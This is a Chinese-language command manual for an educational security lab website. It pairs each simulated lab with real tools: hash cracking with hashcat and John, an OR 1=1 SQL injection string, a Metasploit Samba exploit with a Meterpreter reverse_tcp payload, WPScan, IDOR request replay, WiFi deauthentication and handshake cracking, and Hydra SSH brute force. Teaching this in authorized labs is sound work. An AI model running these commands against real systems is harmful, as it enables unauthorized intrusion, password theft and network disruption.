# 工具与命令手册

> 配套站点：HyaCy//LAB
> 用途：站点里的实验全是浏览器内的模拟。这份手册介绍每个实验对应的真实工具，以及在你的授权实验环境里完成同类操作时用到的命令。
> Node 版本要求：18 或 20 以上。

## 一、启动本地网页

在项目根目录（`HyaCy-Period1/`）执行：

```bash
npm install
npm run dev
```

终端会打印一个地址，默认是 `http://localhost:5173/`。端口被占用时 Vite 会自动换下一个，以终端输出为准。改完代码保存，浏览器会自动刷新。

其他命令：

| 命令 | 作用 |
|------|------|
| `npm run dev -- --port 5179` | 指定端口启动 |
| `npm run typecheck` | 只做类型检查，不打包 |
| `npm run build` | 类型检查后打包到 `dist/` |
| `npm run preview` | 本地预览打包结果 |
| `npm run preview -- --base /HyaCy-Period1/` | 模拟 GitHub Pages 项目站点的子路径 |

首次安装依赖需要联网。之后 `dev`、`build`、`preview` 都不联网，站点本身也不发任何外部请求。

### 部署到 GitHub Pages

1. 把仓库推到 GitHub，默认分支是 `main` 或 `master`。
2. 在仓库的 Settings → Pages 里，把 Source 选为 **GitHub Actions**。
3. 之后每次推送都会触发 `.github/workflows/pages.yml`，自动构建并发布。

`vite.config.ts` 里 `base` 设成了 `./`，项目站点（`用户名.github.io/仓库名/`）和用户站点（`用户名.github.io/`）都能直接用。

## 二、各实验涉及的工具与命令

> 以下命令只在你自己搭建的、或明确授权的实验环境里使用。对未经授权的目标尝试，可能触犯法律。

### 实验 01、02 哈希与口令：hashid、hashcat、John the Ripper

**工具介绍**

- **hashid**：根据格式判断哈希类型，对应站点里的“长度对照表”。
- **hashcat**：GPU 加速的哈希破解工具，用字典或规则生成候选口令并逐个比对。
- **John the Ripper**：CPU 上的经典破解工具，自带 `unshadow` 等辅助命令。

**常用命令**

```bash
# 判断哈希类型
hashid hash.txt

# 解压 Kali 自带的字典
gzip -d /usr/share/wordlists/rockyou.txt.gz

# hashcat：-m 指定哈希类型，后面依次是哈希文件和字典
hashcat -m 0    hash.txt rockyou.txt    # MD5
hashcat -m 100  hash.txt rockyou.txt    # SHA-1
hashcat -m 1400 hash.txt rockyou.txt    # SHA-256
hashcat -m 3200 hash.txt rockyou.txt    # bcrypt，加了盐，速度慢几个数量级

# John：破解与查看结果
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

**和站点的对应**：站点的“字典比对器”做的就是 hashcat 的核心循环——算摘要、比对、下一个。`-m 3200` 的 bcrypt 比 `-m 0` 的 MD5 慢得多，这就是“存口令要用慢哈希”的原因。

### 实验 03 SQL 注入：MySQL 客户端

**工具介绍**

- **mysql**：命令行客户端，用来观察一条 SQL 语句实际长什么样。
- 实际测试中更常用 **Burp Suite** 或 **sqlmap**，这里不展开。

**常用命令**

```bash
mysql -u root -p          # 登录，-u 是用户名，-p 表示接着输入密码
```

```sql
SHOW DATABASES;                        -- 列出数据库
USE lab;                               -- 切换数据库
SHOW TABLES;                           -- 列出表
DESCRIBE users;                        -- 看表结构

-- 站点里“拼接后”的语句：条件被 OR 1=1 变成恒真
SELECT * FROM users WHERE name = '' OR 1=1-- ' AND pass = '';

-- 参数化查询的写法：问号是占位符，值由程序单独传入
SELECT * FROM users WHERE name = ? AND pass = ?;
```

**和站点的对应**：右侧 SQL 预览里橙色的部分，就是被直接拼进语句的用户输入。修复方式只有一个：所有查询都用占位符，不拼接。

### 实验 04 抓包分析：Wireshark、tshark

**工具介绍**

- **Wireshark**：图形界面的抓包与协议分析工具。三个区域自上而下是数据包列表、分层详情、原始字节。
- **tshark**：Wireshark 的命令行版本，适合写脚本批量处理。

**显示过滤器**（填在 Wireshark 上方的输入框，和站点里的过滤器语法一致）

| 过滤器 | 作用 |
|--------|------|
| `ftp` | 只看 FTP，等价于 `tcp.port == 21` |
| `tcp.port == 21` | 源或目的端口为 21 |
| `udp.port == 53` 或 `dns` | DNS 查询 |
| `tcp.port == 443` 或 `https` | TLS 流量 |
| `ip.addr == 10.10.10.5` | 和这台主机往来的包 |
| `tcp.stream eq 3` | 只看 3 号 TCP 流 |
| `ftp or dns` | 用 `or`、`and`、`not` 组合条件 |

**追踪 TCP 流**：在数据包上右键 → Follow → TCP Stream，会把同一条连接里两个方向的内容按顺序拼起来，明文密码一般就在 `PASS` 那一行。

**tshark 命令**

```bash
tshark -r capture.pcap -Y "ftp"                         # 按显示过滤器筛选
tshark -r capture.pcap -Y "ftp" -T fields -e frame.number -e ip.src -e ftp.request.command
tshark -r capture.pcap -z follow,tcp,ascii,3            # 导出 3 号流的文本
```

`-r` 读取已有抓包文件，`-Y` 后面接显示过滤器，`-z follow,tcp,ascii,<流号>` 对应界面里的追踪流。

### 实验 05 漏洞利用：Metasploit Framework

**工具介绍**

- **msfconsole**：Metasploit 的主界面。模块分三类：`exploit` 利用漏洞，`auxiliary` 扫描和探测，`payload` 利用成功后在目标上执行的代码。
- **nmap**：端口与服务版本扫描，对应流程里的“信息收集”。

**常用命令**

```bash
msfconsole                               # 启动
```

```
nmap -sV -p 445 10.10.10.5               # 信息收集：看 445 端口上跑的是什么版本
search samba                              # 查找模块
use exploit/multi/samba/usermap_script    # 加载模块
show options                              # 看需要填哪些参数
set RHOSTS 10.10.10.5                     # 目标地址
set LHOST 10.10.10.14                     # 回连地址，填攻击机自己的 IP
show payloads                             # 看这个模块支持哪些 Payload
set PAYLOAD linux/x86/meterpreter/reverse_tcp
exploit                                   # 运行，等价于 run
sessions                                  # 列出已建立的会话
sessions -i 1                             # 进入 1 号会话
sysinfo                                   # Meterpreter 里查看目标系统信息
exit                                      # 退出
```

**和站点的对应**：站点把 `search`、`use`、`set`、选 Payload、`exploit` 做成了排序和选择题。真实环境里要自己看 `show options` 和 `show payloads`，每个模块支持的 Payload 不一样，以列表为准。

### 实验 06 指纹扫描：WPScan

**工具介绍**

- **WPScan**：专门扫描 WordPress 的黑盒工具，能识别版本、用户、插件、主题，并标出带已知漏洞的组件。

**常用命令**

```bash
# 枚举用户(u)、有漏洞的插件(vp)、有漏洞的主题(vt)
wpscan --url http://site.lab.test --enumerate u,vp,vt

# 枚举全部插件，不限是否有漏洞
wpscan --url http://site.lab.test --enumerate ap --plugins-detection aggressive

# 结果存成 JSON，便于课堂比对
wpscan --url http://site.lab.test --enumerate vp -o result.json --format json
```

**读输出**：`loginizer v1.6.0 (latest 1.6.1)` 表示当前版本落后。紧跟其后的 `| Detected:` 一行是漏洞说明，这是要优先处理的项。

### 实验 07 越权访问：浏览器开发者工具、curl、Burp Suite

**工具介绍**

- **开发者工具**（F12）的 Network 面板：能看到页面实际发出的请求和参数。
- **curl**：命令行发 HTTP 请求，用来重放改过参数的请求。
- **Burp Suite / OWASP ZAP**：拦截、修改、重放请求，是测试越权的主力工具。
- NFC 部分：Android 上的 **MIFARE Classic Tool** 可读取卡片 UID，硬件工具有 **Proxmark3**。

**常用命令**

```bash
# 重放“订单页”的请求，把编号改成别人的
curl "https://shop.lab.test/order?id=1002" -H "Cookie: session=你的会话值"

# Proxmark3 连接设备后识别卡片
proxmark3 /dev/ttyUSB0
```

```
hf search                                 # 识别卡片类型
```

Proxmark3 的读写命令随固件版本不同，以你所用固件的帮助输出为准（`help`）。

**和站点的对应**：站点里改卡号、改订单编号，对应的分别是复制卡片和改请求参数。防御方式相同：服务端每次都核对“当前用户有没有权访问这条数据”。

### 网络密码破解：Aircrack-ng、hashcat、Hydra

**工具介绍**

- **Aircrack-ng 套件**：无线抓包与 WPA 握手破解。`airmon-ng` 开监听模式，`airodump-ng` 抓包，`aircrack-ng` 跑字典。
- **hashcat**：也能跑 WPA 握手，模式 `22000`。
- **Hydra**：在线登录破解，逐个试用户名和口令。

**常用命令**

```bash
# 1. 无线网卡进入监听模式
airmon-ng start wlan0

# 2. 观察周围的无线网络，记下目标信道和 BSSID
airodump-ng wlan0mon

# 3. 针对目标信道抓包并保存，-c 信道，--bssid 路由器 MAC，-w 保存文件名前缀
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. 另开终端，向客户端发断连包，逼它重新握手
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. 用字典跑握手
aircrack-ng -w rockyou.txt capture-01.cap

# hashcat：先把抓包转成 22000 格式
hcxpcapngtool capture.pcap -o hash.22000
hashcat -m 22000 hash.22000 rockyou.txt

# Hydra：在线试 SSH 口令
hydra -l lin -P rockyou.txt ssh://10.10.10.5 -t 4
```

**和站点的对应**：WPA2 的四次握手可以被离线跑字典，WPA3 的 SAE 每次协商都换随机参数，抓到报文也验证不了口令。Hydra 这种在线方式能被限速和账户锁定挡住，这也是“登录要限速”的原因。
